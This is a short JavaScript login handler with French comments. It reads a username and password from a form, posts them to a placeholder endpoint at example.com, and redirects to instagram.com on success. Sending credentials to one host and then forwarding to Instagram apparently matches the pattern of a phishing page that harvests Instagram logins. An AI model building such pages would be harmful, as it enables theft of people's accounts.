document.addEventListener("DOMContentLoaded", function () {
    const loginFormButton = document.querySelector(".login-form-button");
    
    loginFormButton.addEventListener("click", async function (event) {
        event.preventDefault(); // Empêcher le rechargement de la page
        
        const username = document.querySelector("input[type='text']").value;
        const password = document.querySelector("input[type='password']").value;
        
        if (!username || !password) {
            alert("Veuillez remplir tous les champs.");
            return;
        }
        
        try {
            const response = await fetch("https://example.com/api/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ username, password })
            });
            
            const data = await response.json();
            
            if (data.success) {
                window.location.href = "https://www.instagram.com"; // Redirection après succès
            } else {
                alert("Identifiants incorrects. Veuillez réessayer.");
            }
        } catch (error) {
            console.error("Erreur lors de la connexion :", error);
            alert("Une erreur est survenue. Veuillez réessayer plus tard.");
        }
    });
});
